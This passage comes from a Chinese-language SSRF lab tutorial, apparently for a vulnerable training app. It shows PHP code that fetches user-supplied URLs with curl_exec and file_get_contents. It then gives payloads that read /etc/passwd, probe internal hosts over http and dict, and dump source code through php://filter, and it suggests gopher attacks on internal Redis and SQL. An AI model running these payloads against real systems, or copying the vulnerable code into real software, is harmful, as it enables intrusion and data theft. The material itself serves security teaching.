    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);
    curl_close($CH) ;
//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/http外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;

}
```

使用伪协议

1. file

`http://127.0.0.1:8000/vul/ssrf/ssrf_curl.php?url=file:/etc/passwd`

2. http

`127.0.0.1:8000/vul/ssrf/ssrf_curl.php?url=http://192.168.1.1`

3. dict 

   `/vul/ssrf/ssrf_curl.php?url=dict://192.168.1:80`

更多姿势利用gopher协议打内网服务，如redis、sql、struts2等

## file_get_contents

代码

```php
if(isset($_GET['file']) && $_GET['file'] !=null){
    $filename = $_GET['file'];
    $str = file_get_contents($filename);
    echo $str;
}
```

利用方式还是一样的，但还是有些区别

`/vul/ssrf/ssrf_fgc.php?file=file:///etc/passwd`

`/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php` // 这个伪协议在curl下利用失败
